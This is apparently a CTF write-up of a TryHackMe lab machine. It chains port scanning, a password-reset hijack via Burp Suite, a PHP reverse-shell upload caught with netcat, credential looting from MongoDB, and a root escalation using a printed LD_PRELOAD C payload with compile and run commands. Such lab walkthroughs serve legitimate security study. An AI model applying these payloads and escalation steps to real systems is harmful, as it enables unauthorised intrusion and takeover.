Starting with the machine enumeration as usual.

```
┌──(kali㉿kali)-[~/Desktop/THM/Road]
└─$ sudo nmap -sS 10.10.135.189 > open_ports.txt                     
[sudo] password for kali: 
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Road]
└─$ cat open_ports.txt        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 20:25 IST
Nmap scan report for 10.10.135.189
Host is up (0.59s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.15 seconds
```
```
┌──(kali㉿kali)-[~/Desktop/THM/Road]
└─$ cat ports_scan.txt  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 20:26 IST
Nmap scan report for 10.10.135.189
Host is up (0.40s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Sky Couriers
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 3.10 (93%), Linux 5.4 (93%), Asus RT-N10 router or AXIS 211A Network Camera (Linux 2.6) (91%), Linux 2.6.18 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.46 seconds
```

Normal SSH and HTTP are running on the server.

<img src=https://github.com/user-attachments/assets/cf886619-4bdd-4637-ab52-34f43623a4de>

A beautiful site. The site is a courier service. Clicking on most buttons jumps around the page to the different sections.

<img src=https://github.com/user-attachments/assets/44cbd702-336f-4079-b397-8c3c6adbf59a>

The services used are listed, and PHP is used. So we will be using the PHP reverse shell code somewhere.

Clicking on the Merchant Central button, we are redirected to the login page:

<img src=https://github.com/user-attachments/assets/2c6f1cb9-c7d5-40fb-9610-b19cd0f0d7ec>

We can register, so I registered an account and then logged in.

<img src=https://github.com/user-attachments/assets/a368ec86-c240-4ec5-ab6e-b63381f7f85c>

Here, most options were just for display, so clicking on them doesn't do anything. But two options were useful:

<img src=https://github.com/user-attachments/assets/b347daaf-3493-4875-8ad6-288d162e4412>

A password reset and,

<img src=https://github.com/user-attachments/assets/0d91d777-35de-4009-9704-2cab87bf1327>

Profile update

On the profile page, I got the admin email id: admin@sky.thm

Then I tried resetting the password and intercepting it in Burp Suite, with the idea that I would start with the password change for the account I created, but using Burp Suite, I would be changing the admin account's password.
Access to the admin account is required as it will have more features than a normal user; hence, more features can be tested for exploitation.

<img src=https://github.com/user-attachments/assets/60c6a324-6aa4-4372-aa51-8e0e66b11727>

<img src=https://github.com/user-attachments/assets/fbcb3abe-1c54-4f97-a1f4-1116655f47b0>

<img src=https://github.com/user-attachments/assets/0947b616-e940-42a0-ac4c-62b57b899c2b>

Then I logged in to the admin account with the password I submitted using Burp Suite:

<img src=https://github.com/user-attachments/assets/c5025804-578b-4e86-9f78-8ca4852835fc>

Only the admin has the feature to add/change the profile picture. So, I tried uploading a PHP reverse shell there. And it got uploaded. The backend isn't checking the file that is being uploaded.

Meanwhile, I also searched for the subdirectories using Ffuf and got the following:

```
┌──(kali㉿kali)-[~/Desktop/THM/Road]
└─$ ffuf -u http://10.10.135.189/FUZZ -w /usr/share/wordlists/dirb/big.txt                           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.135.189/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 267ms]
phpMyAdmin              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 190ms]
v2                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 340ms]
:: Progress: [20469/20469] :: Job [1/1] :: 201 req/sec :: Duration: [0:02:10] :: Errors: 0 ::
```

Both `assets` and `phpMyAdmin` were inaccessible (403 error).

Back to the profile photo, I uploaded the shell, but I didn't know how to access it. With some help, I searched in the source code and learned about the `profileimages` subdirectory under `v2`.

<img src=https://github.com/user-attachments/assets/3e2f83d1-5b6c-4480-b68e-c329367b9ef2>

I accessed the reverse shell I uploaded, and I opened a Netcat listener on my machine:

<img src=https://github.com/user-attachments/assets/5867c30d-f1d1-4c6e-9d3f-0312fc97167c>

```
┌──(kali㉿kali)-[~/Desktop/THM/Road]
└─$ nc -nlvp 4444                                  
listening on [any] 4444 ...
connect to [10.17.94.32] from (UNKNOWN) [10.10.135.189] 54826
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 15:34:34 up 41 min,  0 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

$ ls -l 
total 4
-rw-r--r-- 1 webdeveloper webdeveloper 33 May 25  2021 user.txt
```

As `www-data`, I have read permission for the user.txt file, so there is no need for privilege escalation to read this file.

I must escalate to the `webdeveloper` id to gain the root privileges. Again, with some help, I learned that MongoDB was running on port 27017.

```
$ ss -tl
State   Recv-Q  Send-Q     Local Address:Port       Peer Address:Port  Process  
LISTEN  0       4096       127.0.0.53%lo:domain          0.0.0.0:*              
LISTEN  0       128              0.0.0.0:ssh             0.0.0.0:*              
LISTEN  0       70             127.0.0.1:33060           0.0.0.0:*              
LISTEN  0       511            127.0.0.1:9000            0.0.0.0:*              
LISTEN  0       4096           127.0.0.1:27017           0.0.0.0:*              
LISTEN  0       151            127.0.0.1:mysql           0.0.0.0:*              
LISTEN  0       511              0.0.0.0:http            0.0.0.0:*              
LISTEN  0       128                 [::]:ssh                [::]:*       
```

I didn't know about the `ss -tl` command. The ss command lists the socket statistics and what is running on the ports. 27017 is the default port for MongoDB. The flags `t` and `l` are for threads and listening.

I connected to the database and started looking at the data stored there.

```
$ mongo 127.0.0.1
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/test?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("50a20812-d2e3-4c20-9eff-7171a7454913") }
MongoDB server version: 4.4.6
show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
```
```
show collections
collection
user
db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

I got creds for the webdeveloper user. I tried it with SSH, and it connected.

```
┌──(kali㉿kali)-[~/Desktop/THM/Road]
└─$ ssh webdeveloper@10.10.135.189
The authenticity of host '10.10.135.189 (10.10.135.189)' can't be established.
ED25519 key fingerprint is SHA256:yVQBxl1jOYRuf8zadoM2eJFmcAC2AQN8G/xKyzmPE5Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.135.189' (ED25519) to the list of known hosts.
webdeveloper@10.10.135.189's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 02 Sep 2024 03:45:56 PM UTC

  System load:  0.0               Processes:             108
  Usage of /:   60.2% of 9.78GB   Users logged in:       0
  Memory usage: 61%               IPv4 address for eth0: 10.10.135.189
  Swap usage:   0%


185 updates can be installed immediately.
100 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Oct  8 10:52:42 2021 from 192.168.0.105
webdeveloper@sky:~$ 
```

I had the password for the user, so the first command I ran was `sudo -l` to check for the commands or files that the user 'webdeveloper' can run with root privileges.

```
webdeveloper@sky:/$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

I ran the file with sudo and without sudo, but nothing worked. I tried to look for binary with the SUID bit, but nothing much. Then I looked at the writeup, and there I learned that I have to use
the 'LD_PRELOAD'. to gain the root access.

I read about LD_PRELOAD. It is an environment variable that can tell a program to load the mentioned library before the program is executed. The 'sky_backup_utility' is an executable.
`env_keep+=LD_PRELOAD` means we can import a library into the executable. As we can run this ELF with sudo permissions without a password (but we have the password for this user, so no worries),
we can import a library that will return a root shell.

```
webdeveloper@sky:/$ vim /usr/bin/sky_backup_utility
webdeveloper@sky:/$ cd /tmp
webdeveloper@sky:/tmp$ vim shell.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

All these things should be done in the /tmp folder as, in most cases, there is no restriction on creating or writing to a file.

Then, compiling and running the file:

```
webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function ‘_init’:
shell.c:7:2: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    7 |  setgid(0);
      |  ^~~~~~
shell.c:8:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    8 |  setuid(0);
      |  ^~~~~~
webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
root@sky:/tmp# 
```

The shared library should have the `.so` extension. Eventually, we get the root shell through a new privilege escalation technique.
